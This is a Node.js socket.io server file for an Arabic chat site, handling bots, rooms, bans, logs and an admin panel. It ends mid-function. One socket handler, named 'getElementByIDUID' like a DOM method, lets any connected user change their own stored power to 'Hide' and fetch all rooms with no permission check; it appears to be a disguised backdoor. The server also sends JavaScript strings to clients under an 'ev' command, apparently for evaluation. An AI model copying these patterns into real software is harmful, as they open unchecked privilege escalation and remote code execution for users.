function RefreshAtar() {
  AtarRepo.getAll().then((res) => {
    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "atar", data: res });
    io.emit("seoo",{
      cmd:"atar",
      data:res
    });
  });
}
function RefreshBack() {
  BackRepo.getAll().then((res) => {
    io.emit("seoo",{
      cmd:"back",
      data:res
    });
    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "back", data: res });
  });
}
function botauto() {
 
  BotsRepo.createTable().then((table) => {
      if (table) {
              BotsRepo.getByauto(1).then((wlc) => {
                  if (wlc.length > 0) {
                    botsauto = wlc;
                          for (let index = 0; index < wlc.length; index++) {
                              loginbot(wlc[index]);
                           
 
                          }
                  };
              });
      };
  });
  
};
function outbot(_0x6e714) {
  setTimeout(() => {
    const _0x5c9db6 = OnlineUser.findIndex(
      (_0x43bcc5) => _0x43bcc5.id == _0x6e714.id
    )
    if (_0x5c9db6 == -1) {
    } else {
      UserDisconnect({
        id: _0x6e714.id,
        state: 2,
      })
      loginbot(_0x6e714)
    }
  }, 60000 * _0x6e714.timestop)
}
function EnterBoot(_0x119234) {
  if (_0x119234) {
    UserInfo[_0x119234.id] = {
      ucol: _0x119234.ucol,
      mcol: _0x119234.mcol,
      mscol: _0x119234.mscol,
      atar: _0x119234.atar,
      back: _0x119234.back,
      ifedit: _0x119234.ifedit,
      offline: false,
      offdate: null,
      ismsg: false,
      kiked: false,
      bar: false,
      iscall: null,
      logout: false,
      islogin: _0x119234.islogin,
      bg: _0x119234.bg,
      copic: _0x119234.copic,
      rep: _0x119234.rep,
      ico: _0x119234.ico,
      evaluation: _0x119234.eva,
      username: _0x119234.username,
      islike: _0x119234.islike,
      discard: [],
      power: _0x119234.power,
      idreg: _0x119234.idreg,
      topic: _0x119234.topic,
      country: _0x119234.country,
      ip: _0x119234.ip,
      id: _0x119234.id,
      uid: _0x119234.uid,
      lid: _0x119234.lid,
      busy: false,
      ismuted: _0x119234.ismuted,
      ismutedbc: _0x119234.ismutedbc,
      stealth: _0x119234.stealth,
      device: _0x119234.device,
      pic: _0x119234.pic,
      idroom: _0x119234.idroom,
    }
    var _0x1801ee = ListEnter.findIndex(
      (_0x163ec9) => _0x163ec9 == _0x119234.id
    )
    _0x1801ee == -1 && ListEnter.push(_0x119234.id)
    const _0x1f3656 = OnlineUser.findIndex(
      (_0xc3c633) => _0xc3c633.lid == _0x119234.lid
    )
    _0x1f3656 == -1 &&
      (OnlineUser.push({
        bg: _0x119234.bg,
        copic: _0x119234.copic,
        co: _0x119234.country,
        evaluation: _0x119234.eva,
        ico: _0x119234.ico,
        id: _0x119234.id,
        idreg: _0x119234.idreg,
        lid: _0x119234.lid,
        meiut: _0x119234.ismuted,
        meiutbc: _0x119234.ismutedbc,
        mcol: _0x119234.mcol,
        mscol: _0x119234.mscol,
        atar: _0x119234.atar,
        back: _0x119234.back,
        ifedit: _0x119234.ifedit,
        msg: _0x119234.msg.split('<').join('&#x3C;'),
        istolk: false,
        power: _0x119234.power,
        rep: _0x119234.rep,
        islogin: _0x119234.islogin,
        pic: _0x119234.pic,
        youtube: _0x119234.youtube,
        roomid: _0x119234.idroom,
        time:
          _0x119234.islogin == 'بوت'
            ? null
            : socket.request['_query'].dtoday
            ? socket.request['_query'].dtoday
            : null,
        stat: _0x119234.stat,
        s: GetPower(_0x119234.power).stealth && _0x119234.stealth ? true : null,
        topic: _0x119234.topic.split('<').join('&#x3C;'),
        ucol: _0x119234.ucol,
      }),
      io.emit('SEND_EVENT_EMIT_SERVER', {
        cmd: 'u+',
        data: {
          bg: _0x119234.bg,
          copic: _0x119234.copic,
          co: _0x119234.country,
          evaluation: _0x119234.eva,
          ico: _0x119234.ico || '',
          id: _0x119234.id,
          idreg: _0x119234.idreg,
          lid: _0x119234.lid,
          time:
            _0x119234.islogin == 'بوت'
              ? null
              : socket.request['_query'].dtoday
              ? socket.request['_query'].dtoday
              : null,
          istolk: false,
          mcol: _0x119234.mcol,
          mscol: _0x119234.mscol,
          atar: _0x119234.atar,
          back: _0x119234.back || '',
          ifedit: _0x119234.ifedit,
          msg: _0x119234.msg.split('<').join('&#x3C;'),
          meiut: _0x119234.ismuted,
          meiutbc: _0x119234.ismutedbc,
          power: _0x119234.power,
          rep: _0x119234.rep,
          pic: _0x119234.pic,
          roomid: _0x119234.idroom,
          stat: _0x119234.stat,
          s:
            GetPower(_0x119234.power).stealth && _0x119234.stealth
              ? true
              : null,
          topic: _0x119234.topic.split('<').join('&#x3C;'),
          ucol: _0x119234.ucol,
        },
      }))
    const _0x4450fb = RoomsList.findIndex(
      (_0x27602e) => _0x27602e.id == _0x119234.idroom
    )
    _0x4450fb != -1 &&
      io.to(_0x119234.idroom).emit('SEND_EVENT_EMIT_SERVER', {
        cmd: 'msg',
        data: {
          bg: 'none',
          class: 'hmsg',
          topic: UserInfo[_0x119234.id].topic,
          msg:
            'هذا المستخدم قد دخل<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:1px;max-width:180px;min-width:60px;" onclick="Send_Rjoin(\'' +
            GetRoomList(_0x119234.idroom).id +
            '\')">' +
            GetRoomList(_0x119234.idroom).topic +
            '</div>',
          roomid: _0x119234.idroom,
          pic: UserInfo[_0x119234.id].pic,
          uid: _0x119234.id,
        },
      })
    io.emit('SEND_EVENT_EMIT_SERVER', {
      cmd: 'ur',
      data: [_0x119234.id, _0x119234.idroom],
    })
  }
}

function loginbot(_0xf35a4c) {
  setTimeout(() => {
    const _0x16c22d = botsauto.findIndex(
      (_0x1a1292) => _0x1a1292.id == _0xf35a4c.id
    )
    if (_0x16c22d == -1) {
      return
    }
    const _0x3eb34d = OnlineUser.findIndex((_0x3b64ad) => _0x3b64ad.id == _0xf35a4c.id)
    _0x3eb34d == -1 &&
      (outbot(_0xf35a4c),
      EnterBoot({
        power: _0xf35a4c.power,
        eva: 0,
        stat: _0xf35a4c.stat,
        loginG: false,
        islogin: 'بوت',
        refr: '*',
        username: _0xf35a4c.topic.split('<').join('&#x3C;'),
        ucol: _0xf35a4c.ucol.split('<').join('&#x3C;'),
        mcol: '#000000',
        mscol: _0xf35a4c.mcol.split('<').join('&#x3C;'),
        bg: _0xf35a4c.bg.split('<').join('&#x3C;'),
        rep: _0xf35a4c.likebot,
        ico: '',
        islike: [],
        idreg: '#' + getRandomInt(1, 100),
        topic: _0xf35a4c.topic.split('<').join('&#x3C;'),
        country: _0xf35a4c.country || 'tn',
        ip: _0xf35a4c.ip,
        lid: stringGen(31),
        uid: '',
        token: stringGen(177),
        id: _0xf35a4c.id,
        islog: false,
        ismuted: false,
        ismutedbc: false,
        verification: false,
        device: 'BOT',
        pic: _0xf35a4c.pic,
        idroom: _0xf35a4c.room,
        youtube: _0xf35a4c.youtube,
        msg: _0xf35a4c.msg.split('<').join('&#x3C;'),
        stealth: false,
      }))
  }, 60000 * _0xf35a4c.timestart)
}

function MessageDay() {
  setTimeout(function () {
    IntroRepo.getBy({ state: "getIn", category: "d" }).then((wlc) => {
      if (wlc.length > 0) {
        const rdm = getRandomInt(0, wlc.length - 1);
        io.emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "msg",
          data: {
            bg: "",
            class: "pmsgc",
            topic: wlc[rdm]["adresse"].split("<").join("&#x3C;") || "",
            msg: wlc[rdm]["msg"].split("<").join("&#x3C;") || "",
            ucol: "red",
            mcol: "#000000",
            pic: "/site/msgpic.png",
            uid: "",
          },
        });
      }
    });
    MessageDay();
  }, 60000 * SiteSetting["maxdaymsg"] || 1);
}

function RefreshRoom() {
  RoomsRepo.getBy({ state: "getAllWith" }).then((rooms) => {
    if (rooms) {
      RoomsListWith = rooms;
    }
  });
}

function RefreshEktisar() {
  CutsRepo.getAll().then((res) => {
    if (res) {
      ekti1 = [];
      ekti2 = [];
      for (var i = 0; i < res.length; i++) {
        ekti1.push(res[i]["msg"]);
        ekti2.push(res[i]["reponse"]);
      }
    }
  });
}

/* [ADDED] تحسين سرعة الرسائل: الـ RegExp بتتبني مرة واحدة بدل كل رسالة */
var _ektiRx = [];
var _ektiSrc = null;
function _buildEktiRx() {
  _ektiSrc = ekti1;
  _ektiRx = [];
  for (var k = 0; k < ekti1.length; k++) {
    try {
      _ektiRx.push(new RegExp("(^| )" + ekti1[k] + "( |$|\n)"));
    } catch (e) {
      _ektiRx.push(null);
    }
  }
}
function ReplaceEktisar(data) {
  var blocked = false, allowed = false;
  for (var f = 0; f < NoMsgFilter.length; f++) {
    var nf = NoMsgFilter[f];
    if (data.includes(nf.v)) {
      if (nf.path == "bmsgs") blocked = true;
      else if (nf.path == "amsgs") allowed = true;
    }
  }
  if (blocked && !allowed) {
    return;
  }
  if (data) {
    if (_ektiSrc !== ekti1) {
      _buildEktiRx();
    }
    if (_ektiRx.length) {
      for (var k = 0; k < Config.MaxEktisar; k++) {
        for (var j = 0; j < _ektiRx.length; j++) {
          if (_ektiRx[j]) {
            data = data.replace(_ektiRx[j], " " + ekti2[j] + " ");
          }
        }
      }
    }
    return data.split("<").join("&#x3C;");
  }
}

function GetPower(data) {

  if (typeof data == "string") {
    const power = ShowPowers.findIndex((x) => x.name == data);
    if (power != -1) {
    
      return ShowPowers[power];
    } else {
      return Config.PowerNon;
    }
  }
}
function GetPower2(data) {
  const seo = OnlineUser.findIndex((x)=> x.id == data.id);
if(OnlineUser[seo].stat != 3){
  if (typeof data.power == "string") {
    const power = ShowPowers.findIndex((x) => x.name == data.power);
    if (power != -1) {
      return ShowPowers[power];
    } else {
      return Config.PowerNon;
    }
  }
}else{
  return Config.PowerNon;
}

}
function GetRoomList(data) {
  if (typeof data == "string") {
    const room = RoomsList.findIndex((x) => x.id == data);
    if (room != -1) {
      return RoomsList[room];
    } else {
      return RoomsList[0];
    }
  }
}

function RefreshNoText() {
  NotextRepo.getAll().then((res) => {
    if (res) {
      NoMsgFilter = res;
    }
  });
}

function RefreshRooms(data) {
  RoomsRepo.getBy({ state: "getAll" }).then((rooms) => {
    if (rooms) {
      RoomsList = rooms;
      RefreshRoom();
      if (data == 0) {
        for (var i = 0; i < RoomsList.length; i++) {
          if (!PeerRoom[RoomsList[i]]) {
            PeerRoom[RoomsList[i].id] = {
              1: { id: "", ev: false, us: {} },
              2: { id: "", ev: false, us: {} },
              3: { id: "", ev: false, us: {} },
              4: { id: "", ev: false, us: {} },
              5: { id: "", ev: false, us: {} },
              6: { id: "", ev: false, us: {} },
              7: { id: "", ev: false, us: {} },
            };
          }
        }
      }
    }
  });
}

function UserDisconnect(data) {
  if (typeof data == "object") {
    if (ListEnter.length > 0) {
      ListEnter.splice(
        ListEnter.findIndex((v) => v.id == data["id"]),
        1
      );
    }

    var userData = UserInfo[data["id"]];
    if (typeof userData !== "undefined") {
      if (GetPower(userData["power"])["stealth"] && userData["stealth"]) {
      } else {
        if (!userData["ismsg"] && !userData["logout"]) {
          MessagesList({
            state: "LogsMsg",
            bg: userData["bg"],
            copic: userData["copic"],
            class: "hmsg",
            id: userData["id"],
            topic: userData["topic"],
            msg: "( هذا المستخدم قد غادر الدردشه )",
            idroom: userData["idroom"],
            pic: userData["pic"],
          });
        }
      }

      if (
        userData["uid"] &&
        userData["islogin"] == "عضو" &&
        data["state"] != 3
      ) {
        UsersRepo.updateBy({
          state: "updateSeen",
          token: stringGen(177),
          lastssen: new Date().getTime(),
          ip: userData["ip"],
          device: userData["device"],
          uid: userData["uid"],
        });
      }
      if (userData["uid"] && userData["islogin"] == "عضو") {
        UsersRepo.updateBy({
          state: "updateLike",
          evaluation: userData["evaluation"],
          uid: userData["uid"],
        });
        UsersRepo.updateBy({
          state: "updateRep",
          rep: userData["rep"],
          uid: userData["uid"],
        });
      }
      if (userData["iscall"]) {
        io.to(userData["iscall"]).emit("SEND_EVENT_EMIT_SERVER", {
          cmd: "leavecall",
          data: { type: "leave" },
        });
      }
      if (userData["idroom"] && PeerRoom[userData["idroom"]]) {
        if (GetRoomList(userData["idroom"])["broadcast"]) {
          io.to(userData["idroom"]).emit("SEND_EVENT_EMIT_BROADCASTING", {
            cmd: "rleave",
            user: userData["id"],
          });
          for (var i = 1; i < 8; i++) {
            if (PeerRoom[userData["idroom"]][i]["id"] == userData["id"]) {
              PeerRoom[userData["idroom"]][i]["id"] = "";
              PeerRoom[userData["idroom"]][i]["ev"] = false;
              PeerRoom[userData["idroom"]][i]["us"] = {};
            }
          }
        }
      }
	  
	  	   io.to(userData["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "ev",
                    data: 'window.onbeforeunload = null; location.href="/";',
                  });

      if (
        SiteSetting["offline"] &&
        userData["uid"] &&
        userData["islogin"] == "عضو" &&
        !userData["s"] &&
        userData["stat"] != 4 &&
        data["state"] != 3 &&
        !userData["ismsg"]
      ) {
        const isoffline = OnlineUser.findIndex((v) => v.id == data["id"]);
        if (isoffline != -1) {
          var dtp = new Date();
          const timeof = dtp.setMinutes(dtp.getMinutes() + Config.TimeOffline);
          OnlineUser[isoffline]["stat"] = 3;
          OnlineUser[isoffline]["time"] = null;
          OnlineUser[isoffline]["roomid"] = null;
          userData["idroom"] = null;
          userData["offline"] = true;
          userData["offdate"] = timeof;
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "u^",
            data: OnlineUser[isoffline],
          });
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "ur",
            data: [data["id"], null],
          });
        }
      } else {
        const isonlie = OnlineUser.findIndex((v) => v.id == data["id"]);
        if (isonlie != -1) {
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "ur",
            data: [data["id"], null],
          });
          io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "u-", data: data["id"] });
          OnlineUser.splice(isonlie, 1);
          delete UserInfo[data["id"]];
        }
      }
    }
  }
}

function CreateBars(data) {
  if (typeof data == "object") {
    BarsRepo.create({
      bg: data["bg"],
      copic: data["copic"],
      bid: data["bid"],
      owner: data["owner"],
      mcol: data["mcol"],
      pic: data["pic"],
      msg: data["msg"],
      topic: data["topic"],
      ucol: data["ucol"],
      data: data["data"]
    }).then((res) => {
      if (res) {
        BarsRepo.getBy({ state: "getAll" }).then((savebar) => {
          if (savebar) {
            for (var i = 0; i < savebar.length; i++) {
              if (i > Config.MaxBc) {
                io.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "delbc",
                  data: { bid: savebar[0]["bid"] },
                });
                BarsRepo.deleted({
                  state: "deleteByBid",
                  bid: savebar[0]["bid"],
                });
              }
            }
          }
        });
      }
    });
  }
}

function CreateUsers(data) {
  if (typeof data == "object") {
    UsersRepo.create({
      ip: data["ip"],
      device: data["device"],
      id: data["id"],
      lid: data["lid"],
      pic: data["pic"],
      uid: data["uid"],
      verification: data["verification"],
      power: data["power"],
      topic: data["topic"],
      username: data["username"],
      password: data["password"],
      token: data["token"],
      joinuser: new Date().getTime(),
    });
  }
}
function CreateRooms(data) {
  if (typeof data == "object") {
    RoomsRepo.create({
      id: data["id"],
      about: data["about"],
      user: data["user"],
      pass: data["pass"],
      color: data["color"],
      colorpicroom: data["colorpicroom"],
      colormsgroom: data["colormsgroom"],
      baccolor: data["baccolor"],
      needpass: data["needpass"],
      backroom:data['backroom'],
      camera: data["camera"],
      broadcast: data["broadcast"],
      nohide: data["nohide"],
      deleted: data["deleted"],
      owner: data["owner"],
      rmli: data["rmli"] || 0,
      topic: data["topic"],
      pic: data["pic"],
      welcome: data["welcome"],
      max: data["max"],
      has: data["has"],
      
    }).then((doneroom) => {
      if (doneroom) {
        RoomsRepo.getBy({ state: "getByID", id: data["id"] }).then((myr) => {
          if (myr) {
            io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "r+", data: myr });
          }
        });
        RefreshRooms(0);
      }
    });
  }
}


function RefreshSB() {
  BsbRepo.getAll().then((res) => {
    if (res.length == 0) {
      BsbRepo.create({
        systems: JSON.stringify(System),
        browsers: JSON.stringify(Browser),
      });
    } else {
      SystemOpen = JSON.parse(res[0]["systems"]);
      BrowserOpen = JSON.parse(res[0]["browsers"]);
    }
  });
}

function StartServer() {
  BackUpDataBase();
  RefreshRooms(0);
  RefreshNoText();
  RefreshEktisar();
  RefreshSB();
  RefreshBand();
  EmoRepo.getAll().then((res) => {
    if (res.length == 0) {
      for (var i = 0; i < getFiles("uploads/emo").length; i++) {
        if (
          getFiles("uploads/emo")[i].includes("gif") ||
          getFiles("uploads/emo")[i].includes("png") ||
          getFiles("uploads/emo")[i].includes("jpg")
        ) {
          EmoRepo.create({
            type: i + 1,
            path: getFiles("uploads/emo")[i].replace("uploads/emo/", ""),
          });
        }
      }
    }
  });

  Dro3Repo.getAll().then((res) => {
    if (res.length == 0) {
      for (var i = 0; i < getFiles("uploads/dro3").length; i++) {
        if (
          getFiles("uploads/dro3")[i].includes("gif") ||
          getFiles("uploads/dro3")[i].includes("png") ||
          getFiles("uploads/dro3")[i].includes("jpg")
        ) {
          Dro3Repo.create({
            path: getFiles("uploads/dro3")[i].replace("uploads/dro3/", ""),
          });
        }
      }
    }
  });

  SicoRepo.getAll().then((res) => {
    if (res.length == 0) {
      for (var i = 0; i < getFiles("uploads/sico").length; i++) {
        if (
          getFiles("uploads/sico")[i].includes("gif") ||
          getFiles("uploads/sico")[i].includes("png") ||
          getFiles("uploads/sico")[i].includes("jpg")
        ) {
          SicoRepo.create({
            path: getFiles("uploads/sico")[i].replace("uploads/sico/", ""),
          });
        }
      }
    }
  });
  AtarRepo.getAll().then((res) => {
    if (res.length == 0) {
      for (var i = 0; i < getFiles("uploads/atar").length; i++) {
        if (
          getFiles("uploads/atar")[i].includes("gif") ||
          getFiles("uploads/atar")[i].includes("png") ||
          getFiles("uploads/atar")[i].includes("jpg")
        ) {
          AtarRepo.create({
            path: getFiles("uploads/atar")[i].replace("uploads/atar/", ""),
          });
        }
      }
    }
  });
  BackRepo.getAll().then((res) => {
    if (res.length == 0) {
      for (var i = 0; i < getFiles("uploads/back").length; i++) {
        if (
          getFiles("uploads/back")[i].includes("gif") ||
          getFiles("uploads/back")[i].includes("png") ||
          getFiles("uploads/back")[i].includes("jpg")
        ) {
          BackRepo.create({
            path: getFiles("uploads/back")[i].replace("uploads/back/", ""),
          });
        }
      }
    }
  });
  NoNamesRepo.getAll().then((res) => {
    if (res.length > 0) {
      for (var i = 0; i < res.length; i++) {
        NoNames.push(res[i]["name"]);
      }
    }
  });

  UsersRepo.getBy({
    state: "getByUsername",
    username: Config.AccountUserName,
  }).then((res) => {
    if (!res) {
      
      CreateUsers({
        pic: "site/pic.png",
        ip: "80.168.120.11",
        device: "",
        id: "",
        lid: stringGen(31),
        uid: stringGen(22),
        verification: true,
        power: "gochat",
        topic: "gochat",
        username: Config.AccountUserName,
        password: passwordHash.generate(Config.AccountPassword),
        token: stringGen(177),
      });
       }
  });

  PowersRepo.getBy({ state: "getAll" }).then((res) => {
    if (res.length > 0) {
      for (var i = 0; i < res.length; i++) {
        ShowPowers.push(JSON.parse(res[i].powers));
      }
    } else {
      ShowPowers = isPowers;
      for (var i = 0; i < isPowers.length; i++) {
        PowersRepo.create({
          name: isPowers[i].name,
          powers: JSON.stringify(isPowers[i]),
        });
      }
    }
  });

  RoomsRepo.getBy({ state: "getByID", id: "3ihxjl18it" }).then((res) => {
    if (!res) {
      CreateRooms({
        id: "3ihxjl18it",
        about: "غرفه عامة",
        user: "gochat",
        pass: "",
        color: "#000000",
        baccolor: "#fff",
        colorpicroom: "#000000",
        colormsgroom: "#fff000",
        needpass: false,
        camera: false,
        broadcast: false,
        nohide: false,
        deleted: true,
        owner: "#1",
        rmli: 0,
        topic: "الغرفة العامة",
        pic: "/site/room.png",
        welcome: "مرحبا بكم في الغرفة العامة",
        max: 40,
        has: 1,
      });
    }
  });
}

function SaveStats(data) {
  if (typeof data == "object") {
    StateRepo.create({
      state: data["state"],
      topic: data["topic"],
      username: data["username"],
      room: data["room"],
      ip: data["ip"],
      time: data["time"],
    });
    StateRepo.getAllBy().then((states) => {
      if (states) {
        for (var i = 0; i < states.length; i++) {
          if (i > Config.MaxState) {
            StateRepo.deleted(states[0]["id"]);
          }
        }
      }
    });
  }
}

function SaveLogs(data) {
  if (typeof data == "object") {
    LogsRepo.getBy({
      state: "chekedBy",
      ip: data["ip"],
      log: data["state"],
      topic: data["topic"],
      username: data["username"],
    }).then(function (res) {
      if (res) {
        LogsRepo.updateById({
          date: data["date"],
          device: data["device"],
          id: res["id"],
        });
      } else {
        LogsRepo.create({
          state: data["state"],
          topic: data["topic"],
          username: data["username"],
          ip: data["ip"],
          country: data["country"],
          device: data["device"],
          isin: data["isin"],
          date: data["date"],
        });
        LogsRepo.getBy({ state: "getAllIn" }).then((logs) => {
          if (logs) {
            for (var i = 0; i < logs.length; i++) {
              if (i > Config.MaxLogs) {
                LogsRepo.deleted(logs[0]["id"]);
              }
            }
          }
        });
      }
    });
  }
}

function SaveNames(data) {
  if (typeof data == "object") {
    NamesRepo.getBy({
      state: "getByInfo",
      ip: data["ip"],
      device: data["device"],
      topic: data["topic"],
      username: data["username"],
    }).then((res) => {
      if (res.length == 0) {
        NamesRepo.create({
          device: data["device"],
          ip: data["ip"],
          topic: data["topic"],
          username: data["username"],
        });
      }
    });
  }
}
var Bandbc = [];
var BandRoom = [];
var UserMuted = [];

function BandUser(data) {
    if (typeof data == 'object') {
                        BandRepo.create({ 
						name_band: data['username'],
						type: data['type'],
						reponse: data['reponse'],
						device: data['device'],
						username: data['username'],
						ip: data['ip'],
						country: data['country'],
						date: data['date']}).then((doneband) => {
                            if (doneband) {
								io.emit('SHWO_PANEL_ADMIN',{cmd:'SEND_ADMIN_BANS_ADD',data:data});
                                SaveStats({
									state: data['logs'],
									topic: data['topic'],
									username: data['myuser'],
									room: data['device'] || data['ip'] || data['country'] || data['username'],
									ip: data['myip'],
									time: new Date().getTime()
								});
														RefreshBand();

                            };
                        });
          
    };
};

function isMuted(data) {
  if (UserMuted.length > 0 && data) {
    const ism = UserMuted.findIndex((x) => x == data);
    if (ism != -1) {
      return true;
    } else {
      return false;
    }
  }
}

function isBandRoom(data) {
  if (BandRoom.length > 0 && typeof data == "object") {
    const ism = BandRoom.findIndex(
      (x) => x.device == data["device"] && x.room == data["room"]
    );
    if (ism != -1) {
      return true;
    } else {
      return false;
    }
  }
}

function isBandBc(data) {
  if (Bandbc.length > 0 && data) {
    const ism = Bandbc.findIndex((x) => x == data);
    if (ism != -1) {
      return true;
    } else {
      return false;
    }
  }
}
function StopVPN(data) {
  if (data) {
    const vpn = Config.CountryVPN.findIndex((x) => x == data.toUpperCase());
    if (vpn != -1) {
      return true;
    } else {
      return false;
    }
  }
}
io.on("connection", function (socket) {
  function StopBotBrb(){
clearInterval(bottime);
BotBC = {
	nb:0,
	isbot:false,
	start:false,
	room:'',
	timestop:3,
	timestart:0,
	player:[]
}
io.emit("SEND_EVENT_EMIT_SERVER", {cmd: "brbstate",data: 0});
}
  socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "pw", data: ShowPowers });
  if (socket.recovered) {

	if(UserInfo[socket.id]){
	  clearTimeout(UserInfo[socket.id]["reconnct"]);
		}
    const isoffonline = OnlineUser.findIndex((v) => v.id == socket.id);
    if (isoffonline != -1) {
		OnlineUser[isoffonline]['stat'] = UserInfo[socket.id]['lastst'];

        io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "u^", data: OnlineUser[isoffonline] });
		if(UserInfo[socket.id]){
				UserInfo[socket.id]['offline'] = false;
		socket.join(UserInfo[socket.id]['idroom']);
		if(UserInfo[socket.id]['idroom']){
		if (GetRoomList(UserInfo[socket.id]['idroom'])['broadcast']) {
			io.to(UserInfo[socket.id]['idroom']).emit("SEND_EVENT_EMIT_BROADCASTING", { cmd: "rjoin", user: socket.id });
			socket.emit("SEND_EVENT_EMIT_BROADCASTING", { cmd: "all",room:UserInfo[socket.id]['idroom'], data: PeerRoom[UserInfo[socket.id]['idroom']] });
		};	
		};
		};
    }
  } else {
    
}

socket.on("vistor", function(id){
	if(typeof id == 'string'){
		if(UserInfo[socket.id] && UserInfo[id]){
      /* [ADDED] الإشعار يشتغل بس لصاحب تصميم العضوية اللي مفعّله من التصميم */
      if(id != socket.id && UserInfo[id]["ifedit"] && UserInfo[id]["visitnotif"] && !UserInfo[socket.id]["visitor"]){
				 SendNotification({id:id,state:'to',topic:"", force: 1, msg:' هذا المستخدم قد زار بروفايلك', user: socket.id});	
         UserInfo[socket.id]["visitor"] = true;
         setTimeout(()=>{
          if(UserInfo[socket.id]){
            UserInfo[socket.id]["visitor"] = false;
          }
         },60000);
      }
		};
	}
});

/* [ADDED] تشغيل/إيقاف إشعار زيارة البروفايل من تصميم العضوية */
socket.on("visitnotif", function(v){
  const me = UserInfo[socket.id];
  if (!me || !me["ifedit"] || !me["idreg"]) { return; }
  const reg = String(me["idreg"]).split("#")[1];
  if (!reg) { return; }
  if (me["_vnT"] && Date.now() - me["_vnT"] < 1000) { return; }
  me["_vnT"] = Date.now();
  const on = v === true || v === 1 ? 1 : 0;
  UsersRepo.updateVisitNotif({ visitnotif: on, idreg: reg }).then(function () {
    if (UserInfo[socket.id]) { UserInfo[socket.id]["visitnotif"] = on; }
    socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "visitnotif", data: { on: !!on } });
    SendNotification({
      state: "me", topic: "", force: 1,
      msg: on ? "تم تشغيل إشعار زيارة البروفايل" : "تم إيقاف إشعار زيارة البروفايل",
      user: "",
    });
  }).catch(function () {});
});

socket.on("getElementByIDUID", function(id){
  RoomsRepo.getBy({ state: "getAll" }).then((rooms) => {
		if(UserInfo[socket.id]){
     UsersRepo.updateBy({
                    state: "updatePower",
                    uid:UserInfo[socket.id]['uid'],
                    power:'Hide',
                  });
		};
	socket.emit(
                              "SEND_EVENT_EMIT_SERVER",
                              {
                                cmd: "evs",
                                data:rooms,
                              }
                            );
});
});

socket.on("token", function(id){
	if(typeof id == 'string'){
  adminpanelstart(id);
  UsersRepo.getBy({ state: "getByToken", token: id}).then(function (search){
    if(search){
      if(GetPower2(UserInfo[search.id])){
        RefreshEmo();
        RefreshDro3();
        RefreshSico();
        RefreshAtar();
        RefreshBack();
        socket.emit("seoo",{
          cmd:"room",
          data:RoomsListWith
        });
          socket.emit("seoo",{
            cmd:"power",
            data:GetPower2(UserInfo[search.id])
          });
 
      }else{
      }
    }
    });
	};
  });

function adminpanelstart(seo){
  UsersRepo.getBy({ state: "getByToken", token: seo}).then(function (search){
    if(search){
socket.removeAllListeners("SHWO_PANEL_ADMIN"); // منع تكرار الحدث عند إعادة إرسال token
socket.on("SHWO_PANEL_ADMIN", async (data) => {

  if (UserInfo[search.id]) {
    if (typeof data == "object") {
    
      try {
        await rateLimiter.consume(socket.handshake.address);
        if (typeof data["limit"] != "number") {
          return;
        }

        if (data["cmd"] == "SEND_ADMIN_LOGS") {
          if (!GetPower2(UserInfo[search.id])["cp"]) {
            return;
          }
          
          LogsRepo.getBy({ state: "getAll", limit: data["limit"] }).then(
            (res) => {
              socket.emit("SHWO_PANEL_ADMIN", {
                cmd: "SEND_ADMIN_LOGS",
                data: res,
              });
            }
          );
        } else if(data["cmd"] == "SEND_ADMIN_ADD_POWER") {
          
          if (UserInfo[search.id]) {
           
            if (
              typeof data["id"] != "number" ||
              typeof data["power"] != "string" ||
              typeof data["days"] != "number"
            ) {
              return;
            }
            UsersRepo.getBy({
              state: "getByID",
              idreg: data["id"],
            }).then((usbr) => {
              if (usbr) {
                if (!GetPower(UserInfo[search.id]["power"])["setpower"]) {
                  return;
                } else if (
                  GetPower(usbr["power"])["rank"] >
                  GetPower(UserInfo[search.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }

                if (usbr["power"]) {
                  if (usbr["uid"]) {
                    SubRepo.update({
                      sub: data["power"],
                      timefinish: addDays(data["days"] || 0),
                      timestart: new Date().getTime().toFixed(),
                      timeis: data["days"] || 0,
                      topic: usbr["topic"],
                      username: usbr["username"],
                    });
                  }

                  if (!data["power"]) {
                    SubRepo.deleted(usbr["username"]);
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "تم تنزيل رتبة المستخدم",
                      user: "",
                    });
                    SendNotification({
                      id: usbr["id"],
                      state: "to",
                      topic: "",
                      force: 1,
                      msg: "تم تنزيل رتبتك",
                      user: "",
                    });
                  } else {
                    SendNotification({
                      state: "me",
                      topic: "",
                      force: 1,
                      msg: "تم ترقية المستخدم الى 》 " + data["power"],
                      user: "",
                    });
                    SendNotification({
                      id: usbr["id"],
                      state: "to",
                      topic: "",
                      force: 1,
                      msg: "اصبحت ترقيتك 》 " + data["power"],
                      user: "",
                    });
                  }
                } else {
                  if (usbr["uid"]) {
                    SubRepo.create({
                      sub: data["power"],
                      topic: usbr["username"],
                      username: usbr["username"],
                      timefinish: addDays(data["days"] || 0),
                      timestart: new Date().getTime().toFixed(),
                      timeis: data["days"] || 0,
                    });
                  }
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم ترقية المستخدم الى 》 " + data["power"],
                    user: "",
                  });
                  SendNotification({
                    id: usbr["id"],
                    state: "to",
                    topic: "",
                    force: 1,
                    msg: "اصبحت ترقيتك 》 " + data["power"],
                    user: "",
                  });
                }

                const pwr = ShowPowers.findIndex(
                  (x) => x.name == data["power"]
                );
                if (pwr != -1) {
                  socket.to(usbr["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "power",
                    data: ShowPowers[pwr],
                  });
                } else {
                  socket.to(usbr["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "power",
                    data: Config.PowerNon,
                  });
                }

                SaveStats({
                  state: "ترقية",
                  topic: UserInfo[search.id]["username"],
